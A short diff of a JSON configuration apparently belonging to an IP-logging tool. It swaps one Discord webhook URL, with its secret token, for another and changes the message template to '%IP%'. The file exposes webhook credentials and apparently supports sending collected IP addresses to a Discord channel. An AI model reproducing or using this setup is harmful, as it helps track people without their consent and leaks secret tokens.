@@ -1,8 +1,8 @@
 {
-  "webhook": "https://discord.com/api/webhooks/1288255939937439774/zbn5dWCJqzaDzj_1sNYDV2QCE90tQq8G8AXnGLIsAmUVbOemGoVPgKcCXImVToN1Iyuk",
+  "webhook": "https://discord.com/api/webhooks/1371638834617385051/v4qFFSX1cUUcR_Esed1GY0Scz8WFwVSYu5e2s8e1k0csOaQgvl73RkH6QgFkhsb1p83_",
   "webhook_name": "Webhook",
   "webhook_avatar": "https://cdn.discordapp.com/embed/avatars/0.png",
-  "message": "YOMABOII %IP%",
+  "message": "%IP%",
 
   "codeblock_type": "small",
 
